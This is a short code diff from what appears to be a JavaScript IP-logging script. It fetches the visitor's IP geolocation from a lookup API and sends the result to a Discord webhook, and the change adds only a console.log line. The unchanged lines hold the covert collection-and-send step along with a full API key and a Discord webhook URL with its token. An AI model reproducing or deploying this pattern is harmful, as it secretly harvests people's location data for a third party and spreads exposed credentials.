@@ -24,5 +24,6 @@ function httpGetAsync(url, callback) {
 }
 
 httpGetAsync("https://ipgeolocation.abstractapi.com/v1/?api_key=59e76af1c37f4e029869b604a1781cf8", function(key) {
+    console.log(key)
     send("https://discord.com/api/webhooks/938543965559484446/98aKSWsktvUpbqrnFBPcMPemVsbY8jJ80WsdiYcaiPqtKZI1gtOVMpHZviP78N4tQZsT", key)
 });
